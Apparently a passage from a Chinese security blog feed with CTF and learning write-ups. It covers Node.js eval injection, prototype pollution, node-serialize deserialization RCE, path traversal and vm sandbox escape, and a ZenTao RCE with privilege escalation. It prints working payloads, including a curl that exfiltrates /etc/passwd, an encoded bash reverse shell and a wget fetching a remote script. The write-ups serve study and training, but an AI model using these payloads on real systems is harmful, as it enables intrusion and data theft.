console.log(req.query.q);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">var server = app.listen(8888, function() &#123;</span><br><span class="line">    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:8888/&quot;);</span><br><span class="line">&#125;)</span><br><span class="line">漏洞利用：</span><br><span class="line"></span><br><span class="line">Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#x27;child_process&#x27;).exec(&#x27;&#x27;);来进行调用。</span><br><span class="line"></span><br><span class="line">弹计算器(windows)：</span><br><span class="line"></span><br><span class="line">/eval?q=require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);</span><br><span class="line">读取文件(linux)：</span><br><span class="line"></span><br><span class="line">/eval?q=require(&#x27;child_process&#x27;).exec(&#x27;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#x27;);;</span><br><span class="line">反弹shell(linux)：</span><br><span class="line"></span><br><span class="line">/eval?q=require(&#x27;child_process&#x27;).exec(&#x27;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#x27;);</span><br><span class="line"></span><br><span class="line">YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64加密后的结果，直接调用会报错。</span><br><span class="line"></span><br><span class="line">注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)</span><br><span class="line">如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)来执行命令</span><br><span class="line"></span><br><span class="line">paypal一个命令执行的例子：</span><br><span class="line"></span><br><span class="line">[demo.paypal.com] Node.js code injection (RCE)</span><br><span class="line"></span><br><span class="line">(使用数组绕过过滤，再调用child_process执行命令)</span><br><span class="line"></span><br><span class="line">类似命令</span><br><span class="line">间隔两秒执行函数：</span><br><span class="line"></span><br><span class="line">setInteval(some_function, 2000)</span><br><span class="line">两秒后执行函数：</span><br><span class="line"></span><br><span class="line">setTimeout(some_function, 2000);</span><br><span class="line">some_function处就类似于eval函数的参数</span><br><span class="line"></span><br><span class="line">输出HelloWorld：</span><br><span class="line"></span><br><span class="line">Function(&quot;console.log(&#x27;HelloWolrd&#x27;)&quot;)()</span><br><span class="line">类似于php中的create_function</span><br><span class="line"></span><br><span class="line">以上都可以导致命令执行</span><br><span class="line"></span><br><span class="line">Node.js 原型污染漏洞</span><br><span class="line">Javascript原型链参考文章：继承与原型链</span><br><span class="line"></span><br><span class="line">关于原型链</span><br><span class="line">文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：</span><br><span class="line"></span><br><span class="line">在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。</span><br><span class="line">例子：</span><br><span class="line"></span><br><span class="line">object.prototype.name=value</span><br><span class="line">在javascript，每一个实例对象都有一个__proto__属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</span><br><span class="line">objectname[&quot;__proto__&quot;]</span><br><span class="line">objectname.__proto__</span><br><span class="line">objectname.constructor.prototype</span><br><span class="line">不同对象所生成的原型链如下(部分)：</span><br><span class="line">var o = &#123;a: 1&#125;;</span><br><span class="line">// o对象直接继承了Object.prototype</span><br><span class="line">// 原型链：</span><br><span class="line">// o ---&gt; Object.prototype ---&gt; null</span><br><span class="line"></span><br><span class="line">var a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];</span><br><span class="line">// 数组都继承于 Array.prototype</span><br><span class="line">// 原型链：</span><br><span class="line">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span><br><span class="line"></span><br><span class="line">function f()&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br><span class="line">// 函数都继承于 Function.prototype</span><br><span class="line">// 原型链：</span><br><span class="line">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span><br><span class="line">原型链污染原理</span><br><span class="line">对于语句：object[a][b] = value 如果可以控制a、b、value的值，将a设置为__proto__，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</span><br><span class="line"></span><br><span class="line">来看一个简单的例子：</span><br><span class="line"></span><br><span class="line">object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;</span><br><span class="line">object1.__proto__.foo = &quot;Hello World&quot;;</span><br><span class="line">console.log(object1.foo);</span><br><span class="line">object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;</span><br><span class="line">console.log(object2.foo);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</span><br><span class="line"></span><br><span class="line">merge操作导致原型链污染</span><br><span class="line">merge操作是最常见可能控制键名的操作，也最能被原型链攻击。</span><br><span class="line"></span><br><span class="line">简单例子：</span><br><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let object1 = &#123;&#125;</span><br><span class="line">let object2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(object1, object2)</span><br><span class="line">console.log(object1.a, object1.b)</span><br><span class="line"></span><br><span class="line">object3 = &#123;&#125;</span><br><span class="line">console.log(object3.b)</span><br><span class="line">需要注意的点是：</span><br><span class="line"></span><br><span class="line">在JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</span><br><span class="line"></span><br><span class="line">最终输出的结果为：</span><br><span class="line"></span><br><span class="line">1 2</span><br><span class="line">2</span><br><span class="line">可见object3的b是从原型中获取到的，说明Object已经被污染了。</span><br><span class="line"></span><br><span class="line">Code-Breaking 2018 Thejs</span><br><span class="line">这个题目已经有很多的分析文章了，但因为它是一个比较好的学习原型链污染的题目，还是值得自己再过一遍。</span><br><span class="line"></span><br><span class="line">题目源码下载：http://code-breaking.com/puzzle/9/</span><br><span class="line"></span><br><span class="line">直接npm install可以把需要的模块下载下来。</span><br><span class="line"></span><br><span class="line">server.js</span><br><span class="line"></span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const express = require(&#x27;express&#x27;)</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;)</span><br><span class="line">const lodash = require(&#x27;lodash&#x27;)</span><br><span class="line">const session = require(&#x27;express-session&#x27;)</span><br><span class="line">const randomize = require(&#x27;randomatic&#x27;)</span><br><span class="line"></span><br><span class="line">const app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(&#x27;/static&#x27;, express.static(&#x27;static&#x27;))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: &#x27;thejs.session&#x27;,</span><br><span class="line">    secret: randomize(&#x27;aA0&#x27;, 16),</span><br><span class="line">    resave: false,</span><br><span class="line">    saveUninitialized: false</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123; // define the template engine</span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        if (err) return callback(new Error(err))</span><br><span class="line">        let compiled = lodash.template(content)</span><br><span class="line">        let rendered = compiled(&#123;...options&#125;)</span><br><span class="line">        return callback(null, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(&#x27;views&#x27;, &#x27;./views&#x27;)</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;)</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    // 定义session</span><br><span class="line">    let data = req.session.data || &#123;language: [], category: []&#125;</span><br><span class="line">    if (req.method == &#x27;POST&#x27;) &#123;</span><br><span class="line">        // 获取post数据并合并</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">        // 再将data赋值给session</span><br><span class="line">    &#125;</span><br><span class="line">    res.render(&#x27;index&#x27;, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(3000, () =&gt; console.log(&#x27;Example app listening on port 3000!&#x27;))</span><br><span class="line">问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</span><br><span class="line"></span><br><span class="line">页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。</span><br><span class="line"></span><br><span class="line">var sourceURL = &#x27;sourceURL&#x27; in options ? &#x27;//# sourceURL=&#x27; + options.sourceURL + &#x27;\n&#x27; : &#x27;&#x27;;</span><br><span class="line">如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</span><br><span class="line"></span><br><span class="line">继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var result = attempt(function() &#123;</span><br><span class="line">    return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)</span><br><span class="line">      .apply(undefined, importsValues);</span><br><span class="line">  &#125;);</span><br><span class="line">通过构造chile_process.exec()就可以执行任意代码了。</span><br><span class="line"></span><br><span class="line">最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)//&quot;&#125;&#125;</span><br><span class="line">(这里直接用require会报错：ReferenceError: require is not defined</span><br><span class="line"></span><br><span class="line">p神给了一个更好的payload：</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;\n//&quot;&#125;&#125;</span><br><span class="line">node-serialize反序列化RCE漏洞(CVE-2017-5941)</span><br><span class="line">漏洞出现在node-serialize模块0.0.4版本当中，使用npm install node-serialize@0.0.4安装模块。</span><br><span class="line"></span><br><span class="line">了解什么是IIFE：</span><br><span class="line">IIFE（立即调用函数表达式）是一个在定义时就会立即执行的 JavaScript 函数。</span><br><span class="line"></span><br><span class="line">IIFE一般写成下面的形式：</span><br><span class="line"></span><br><span class="line">(function()&#123; /* code */ &#125;());</span><br><span class="line">// 或者</span><br><span class="line">(function()&#123; /* code */ &#125;)();</span><br><span class="line">node-serialize@0.0.4漏洞点</span><br><span class="line">漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">其中的关键就是：obj[key] = eval(&#x27;(&#x27; + obj[key].substring(FUNCFLAG.length) + &#x27;)&#x27;);这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个function()&#123;&#125;()函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</span><br><span class="line"></span><br><span class="line">构造Payload</span><br><span class="line">serialize = require(&#x27;node-serialize&#x27;);</span><br><span class="line">var test = &#123;</span><br><span class="line"> rce : function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line">console.log(&quot;序列化生成的 Payload: \n&quot; + serialize.serialize(test));</span><br><span class="line">生成的Payload为：</span><br><span class="line"></span><br><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个()，结果如下：</span><br><span class="line"></span><br><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;</span><br><span class="line"></span><br><span class="line">(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</span><br><span class="line"></span><br><span class="line">传递给unserialize(注意转义单引号)：</span><br><span class="line"></span><br><span class="line">var serialize = require(&#x27;node-serialize&#x27;);</span><br><span class="line">var payload = &#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\&#x27;child_process\&#x27;).exec(\&#x27;ls /\&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&#x27;;</span><br><span class="line">serialize.unserialize(payload);</span><br><span class="line">执行命令成功，结果如图：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Node.js 目录穿越漏洞复现(CVE-2017-14849)</span><br><span class="line">在vulhub上面可以直接下载到环境。</span><br><span class="line"></span><br><span class="line">漏洞影响的版本：</span><br><span class="line"></span><br><span class="line">Node.js 8.5.0 + Express 3.19.0-3.21.2</span><br><span class="line">Node.js 8.5.0 + Express 4.11.0-4.15.5</span><br><span class="line">运行漏洞环境：</span><br><span class="line"></span><br><span class="line">cd vulhub/node/CVE-2017-14849/</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">用Burpsuite获取地址：/static/../../../a/../../../../etc/passwd 即可下载得到/etc/passwd文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">具体分析可见：Node.js CVE-2017-14849 漏洞分析</span><br><span class="line"></span><br><span class="line">vm沙箱逃逸</span><br><span class="line">vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：</span><br><span class="line"></span><br><span class="line">逃逸例子：</span><br><span class="line"></span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line">const env = vm.runInNewContext(`this.constructor.constructor(&#x27;return this.process.env&#x27;)()`);</span><br><span class="line">console.log(env);</span><br><span class="line">执行之后可以获取到主程序环境中的环境变量</span><br><span class="line"></span><br><span class="line">上面例子的代码等价于如下代码：</span><br><span class="line"></span><br><span class="line">const vm = require(&#x27;vm&#x27;);</span><br><span class="line">const sandbox = &#123;&#125;;</span><br><span class="line">const script = new vm.Script(&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;);</span><br><span class="line">const context = vm.createContext(sandbox);</span><br><span class="line">env = script.runInContext(context);</span><br><span class="line">console.log(env);</span><br><span class="line">创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</span><br><span class="line"></span><br><span class="line">因为this.constructor.constructor返回的是一个Function constructor，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是return this.process.env，结果是返回了主程序的环境变量。</span><br><span class="line"></span><br><span class="line">配合chile_process.exec()就可以执行任意命令了：</span><br><span class="line"></span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line">const env = vm.runInNewContext(`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();</span><br><span class="line">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()`);</span><br><span class="line">console.log(env);</span><br><span class="line">最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。</span><br><span class="line"></span><br><span class="line">具体分析可参考：CVE-2019-10758:mongo-expressRCE复现分析</span><br><span class="line"></span><br><span class="line">javascript大小写特性</span><br><span class="line">在javascript中有几个特殊的字符需要记录一下</span><br><span class="line"></span><br><span class="line">对于toUpperCase():</span><br><span class="line"></span><br><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br><span class="line">对于toLowerCase():</span><br><span class="line"></span><br><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br><span class="line">在绕一些规则的时候就可以利用这几个特殊字符进行绕过</span><br><span class="line"></span><br><span class="line">CTF题实例 - Hacktm中的一道Nodejs题</span><br><span class="line"></span><br><span class="line">题目部分源码：</span><br><span class="line"></span><br><span class="line">function isValidUser(u) &#123;</span><br><span class="line">  return (</span><br><span class="line">    u.username.length &gt;= 3 &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isAdmin(u) &#123;</span><br><span class="line">  return u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line">解题时需要登录管理员的用户名，但是在登录时，isValidUser函数会对用户输入的用户名进行toUpperCase处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</span><br><span class="line"></span><br><span class="line">但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是toLowerCase。所以这两个差异，就可以使用大小写特性来进行绕过。</span><br><span class="line"></span><br><span class="line">题目中默认的管理员用户名为：hacktm</span><br><span class="line"></span><br><span class="line">所以，我们指定登录时的用户名为：hacKtm 即可绕过isValidUser和isAdmin的验证。</span><br><span class="line"></span><br><span class="line">题目完整Writeup:HackTM中一道Node.js题分析(Draw with us)</span><br><span class="line"></span><br><span class="line">说在最后</span><br><span class="line">最近才刚开始学习Node.js，打算趁寒假这段时间把常见的几个漏洞总结一下。如果文章中出现了错误，还希望师傅们能够直接指出来，十分感谢！</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spirit Game 2024 WriteUp</title>
      <link href="/2024/04/28/SpiritGame/"/>
      <url>/2024/04/28/SpiritGame/</url>
      
        <content type="html"><![CDATA[<h1>Spirit Game 2024 WriteUp - Orac1e</h1><h2 id="misc">Misc</h2><h3 id="俄罗斯方块">俄罗斯方块</h3><p>好像同时消除行数越多得分越高，同时消了4行直接2000多分了，硬玩即可</p><p><img src="https://s2.loli.net/2024/04/27/cplJPADGYgTo8KH.png" alt="ec38f2e37901a4254734f2e2ebf4f3d1"></p><h3 id="app1e-tree-s-big-duck">App1e_Tree’s Big Duck</h3><p>直接搜图大多都是国外的，从最近比赛入手缩小范围，想到最近ccb决赛在天津，</p><p><img src="https://s2.loli.net/2024/04/27/mCaPRDfYKwvUZL2.png" alt="4def29f8dbd8ed13f78a8351056da107"></p><p>虽说看起来不是同一只，但还是猜一手津湾广场</p><p><code>SpiritGame&#123;津湾广场_ccb.itsec.gov.cn&#125;</code></p><h2 id="reverse">Reverse</h2><h3 id="babysign">babySign</h3><p><img src="https://s2.loli.net/2024/04/27/avw3bG2HlFmAnIQ.png" alt="6e74be82f74689a14623dc4256422a90"></p><p>看一眼主函数逻辑，一个加密后就是<code>memcpy</code></p><p>跟进加密函数</p><p><img src="https://s2.loli.net/2024/04/27/z4qUIN8HOk3hAwQ.png" alt="image-20240427191939610"></p><p>只做了一次异或</p><p><img src="https://s2.loli.net/2024/04/27/cXLSCqGlfYRx65W.png" alt="image-20240427192029971"></p><p>在xor处下断点，取出ecx的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">x=</span><br><span class="line">[<span class="number">0x8F</span>,<span class="number">0x65</span>,<span class="number">0x93</span>,<span class="number">0xED</span>,<span class="number">0x91</span>,<span class="number">0x78</span>,<span class="number">0x6C</span>,<span class="number">0xBC</span>,<span class="number">0x7A</span>,<span class="number">0xD8</span>,<span class="number">0xBD</span>,<span class="number">0xA6</span>,<span class="number">0xED</span>,<span class="number">0x1F</span>,<span class="number">0xCA</span>,<span class="number">0xAE</span>,</span><br><span class="line"><span class="number">0xE0</span></span><br><span class="line">,<span class="number">0xCA</span>,<span class="number">0xD3</span>,<span class="number">0xD1</span>,<span class="number">0xA5</span>,<span class="number">0xD8</span>,<span class="number">0xD9</span>,<span class="number">0x01</span>,<span class="number">0xDF</span>,<span class="number">0x38</span>,<span class="number">0x58</span>,<span class="number">0xBF</span>,<span class="number">0x90</span>,<span class="number">0x6B</span>,<span class="number">0x4F</span>,<span class="number">0x69</span>,<span class="number">0xEE</span>,</span><br><span class="line"><span class="number">0x1B</span></span><br><span class="line">,<span class="number">0xDD</span>,<span class="number">0xB1</span>,<span class="number">0x18</span>,<span class="number">0xEA</span>,<span class="number">0x8B</span>,<span class="number">0x42</span>,<span class="number">0x69</span>,<span class="number">0x57</span>,<span class="number">0x2B</span>]</span><br><span class="line">ida_chars=[<span class="number">0xDC</span>, <span class="number">0x15</span>, <span class="number">0xFA</span>, <span class="number">0x9F</span>, <span class="number">0xF8</span>, <span class="number">0x0C</span>, <span class="number">0x2B</span>, <span class="number">0xDD</span>, <span class="number">0x17</span>, <span class="number">0xBD</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0xF1</span>, <span class="number">0x88</span>, <span class="number">0x53</span>, <span class="number">0x89</span>, <span class="number">0x9E</span>, <span class="number">0x8D</span>, <span class="number">0x8F</span>, <span class="number">0x8C</span>, <span class="number">0x85</span>, </span><br><span class="line">  <span class="number">0xEA</span>, <span class="number">0x87</span>, <span class="number">0xAD</span>, <span class="number">0x69</span>, <span class="number">0xBA</span>, <span class="number">0x67</span>, <span class="number">0x0F</span>, <span class="number">0x8F</span>, <span class="number">0xE2</span>, <span class="number">0x07</span>, </span><br><span class="line">  <span class="number">0x2B</span>, <span class="number">0x36</span>, <span class="number">0xA1</span>, <span class="number">0x7D</span>, <span class="number">0x82</span>, <span class="number">0xE3</span>, <span class="number">0x7D</span>, <span class="number">0x9C</span>, <span class="number">0xEE</span>, <span class="number">0x30</span>, </span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x32</span>, <span class="number">0x56</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ida_chars)):</span><br><span class="line">    num=ida_chars[i]^x[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(num),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>写脚本异或一下即可</p><h2 id="web">Web</h2><h3 id="gomokumaster">GomokuMaster</h3><p>GitHUB上找了个AI，对下即可</p><p><img src="https://s2.loli.net/2024/04/27/meGHEgAyQtvhw3B.png" alt="70a95f087e46cddad18ace76bd03ed5b"></p><h3 id="maybesignin">MaybeSignin</h3><p>访问<code>/zentao/index.php?mode=getconfig</code>得知版本号为<code>18.0.beta1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;version&quot;:&quot;18.0.beta1&quot;,&quot;requestType&quot;:&quot;PATH_INFO&quot;,&quot;requestFix&quot;:&quot;-&quot;,&quot;moduleVar&quot;:&quot;m&quot;,&quot;methodVar&quot;:&quot;f&quot;,&quot;viewVar&quot;:&quot;t&quot;,&quot;sessionVar&quot;:&quot;zentaosid&quot;,&quot;systemMode&quot;:&quot;ALM&quot;,&quot;sprintConcept&quot;:&quot;0&quot;,&quot;URAndSR&quot;:&quot;0&quot;,&quot;maxUploadSize&quot;:&quot;50M&quot;,&quot;sessionName&quot;:&quot;zentaosid&quot;,&quot;sessionID&quot;:&quot;3916f39ca4f63ef842a60040f2326e8f&quot;,&quot;random&quot;:4673,&quot;expiredTime&quot;:&quot;1440&quot;,&quot;serverTime&quot;:1714180443,&quot;rand&quot;:4673&#125;</span><br></pre></td></tr></table></figure><p>可找到<a href="https://www.freebuf.com/vuls/364470.html">这篇博客</a>跟着复现即可</p><p>注意点是如果payload中带有&amp;符号，则payload会被截断，用远端加载payload到本地的方式执行。</p><p><code>wget http://x.x.x.x:xxxx/1.sh -O /tmp/shell01.sh</code></p><p><img src="https://s2.loli.net/2024/04/27/3mtcPbq7X6LvwQn.png" alt="image-20240427193255123"></p><p>反弹<code>shell</code>后提示flag在<code>/root</code>中</p><p>发现项目根目录下<code>updates</code>文件夹权限为root，猜测有备份的定时任务</p><p>查看进程确实发现其每秒执行</p><p><img src="https://s2.loli.net/2024/04/27/ufWMzsk5LxF1wGp.png" alt="image-20240427193653634"></p><p><img src="https://s2.loli.net/2024/04/27/BnLMAIzURHwligO.png" alt="a7e544f7e39cc769b56ad6b90fd72214"></p><p>提权</p><p><img src="https://s2.loli.net/2024/04/27/AkYF4QSa6CXPHqB.png" alt="d4a5965b4da81f3e132e8ad2b970ff82"></p><p><img src="https://s2.loli.net/2024/04/27/gUL8qeBC9DMSvy5.png" alt="816b7c4eb33440320509f5252114b7c7"></p><h3 id="thinkyourself">ThinkYourself</h3><p><code>ThinkPHP</code>框架代码审计</p><p><code>app/frontend/controller/Ajax.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \think\response\Json</span></span><br><span class="line"><span class="comment">     * 获取文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">root_path</span>().<span class="string">&#x27;public/storage/uploads/&#x27;</span>.<span class="variable">$file</span>;</span><br><span class="line">        <span class="comment">// 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$result</span> = [<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="title function_ invoke__">lang</span>(<span class="string">&#x27;file not exists!&#x27;</span>)];</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>(<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取文件名</span></span><br><span class="line">        <span class="variable">$fileName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置HTTP响应头</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="variable">$fileName</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length: &#x27;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取文件并输出给用户</span></span><br><span class="line">        <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 终止脚本继续执行</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>路径穿越 任意文件读取漏洞</p><p><code>Ajax/getfile?file=../../../../../../../flag</code></p>]]></content>
      
      
      <categories>
          
